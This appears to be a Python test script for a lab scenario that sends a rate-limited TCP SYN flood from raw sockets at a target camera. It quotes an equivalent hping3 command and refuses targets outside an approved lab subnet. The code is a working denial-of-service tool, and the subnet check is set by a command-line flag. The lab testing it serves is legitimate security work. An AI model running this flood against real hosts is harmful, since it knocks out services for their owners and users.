#!/usr/bin/env python3
"""
tests/lab_scenarios/syn_flood.py - Rate-limited SYN flood for proposal Table 10 row 3.

The same traffic as the guide's example `hping3 -S -p 80 -i u1000 -c 20000 <camera>`:
TCP SYN packets at a fixed rate (default 1000/s for 20 s), from this computer's own address.
Use it only on the separated lab network. Safety: the target must be inside an approved lab
subnet (default 192.168.50.0/24, settings.yaml lab.approved_scan_subnets); anything else is refused.

Needs Linux and root (raw socket). Only the Python standard library is used.
"""

from __future__ import annotations

import argparse
import ipaddress
import random
import socket
import struct
import sys
import time


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\0"
    s = sum(struct.unpack(f"!{len(data) // 2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def syn_packet(src: str, dst: str, sport: int, dport: int) -> bytes:
    seq = random.getrandbits(32)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 5 << 4, 0x02, 64240, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), random.getrandbits(16), 0, 64,
                     socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(dst))
    ip = ip[:10] + struct.pack("!H", checksum(ip)) + ip[12:]
    return ip + tcp


def own_address(dst: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as u:
        u.connect((dst, 9))
        return u.getsockname()[0]


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--rate", type=int, default=1000, help="packets per second (max 5000)")
    ap.add_argument("--seconds", type=float, default=20.0, help="duration (max 120)")
    ap.add_argument("--approved", default="192.168.50.0/24", help="comma-separated approved subnets")
    args = ap.parse_args()
    nets = [ipaddress.ip_network(n.strip()) for n in args.approved.split(",") if n.strip()]
    if not any(ipaddress.ip_address(args.target) in n for n in nets):
        sys.exit(f"Refused: {args.target} is not in the approved lab subnets {args.approved}")
    rate, secs = min(args.rate, 5000), min(args.seconds, 120.0)
    src = own_address(args.target)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    print(f"SYN flood {src} -> {args.target}:{args.port}, {rate}/s for {secs:.0f} s", flush=True)
    sent, start, gap = 0, time.time(), 1.0 / rate
    nxt = start
    while time.time() - start < secs:
        s.sendto(syn_packet(src, args.target, random.randint(1024, 65535), args.port), (args.target, 0))
        sent += 1
        nxt += gap
        d = nxt - time.time()
        if d > 0:
            time.sleep(d)
    print(f"sent {sent} SYN packets in {time.time() - start:.1f} s", flush=True)


if __name__ == "__main__":
    main()
